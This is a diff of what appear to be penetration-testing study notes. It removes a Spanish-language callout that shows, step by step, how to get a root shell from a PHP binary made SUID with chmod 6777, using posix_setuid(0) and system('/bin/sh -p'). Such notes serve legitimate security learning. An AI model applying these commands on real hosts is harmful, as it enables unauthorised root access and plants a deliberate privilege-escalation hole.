@@ -522,37 +522,3 @@ md5sum shell
 ```
 
 Now, we can go to the remote server and run the same command on the file we transferred
-
-> [!success] EXTRA
-> # Escalada de privilegios vía PHP con SUID (sudo chmod)
-> **Setup**
-> ```shell-session
-> sudo chmod 6777 /usr/bin/php
-> ls -la $(which php)
-> # -rwsrwsrwx. 1 root root ... /usr/bin/php
-> ```
->
-> **Falla (drop de privilegios por ruid≠euid)**
-> ```shell-session
-> php -r "system('/bin/sh -p');"
-> whoami
-> # apache
-> ```
->
-> **Diagnóstico**
-> ```shell-session
-> php -r "echo 'ruid=' . posix_getuid() . ' euid=' . posix_geteuid();"
-> # ruid=48 euid=0  -> discrepancia causa el drop
-> ```
->
-> **Explotación**
-> ```shell-session
-> php -r "posix_setuid(0); posix_setgid(0); system('/bin/sh -p');"
-> whoami
-> # root
-> ```
->
-> **Por qué:** SUID da `euid=0` al proceso padre, pero `/bin/sh` al iniciar compara `ruid` vs `euid`; si difieren, dropea privilegios pese al `-p`. `posix_setuid(0)`/`posix_setgid(0)` igualan `ruid` a `0` antes del fork, eliminando la discrepancia.
->
-> **Ref:** GTFOBins → php → SUID
-
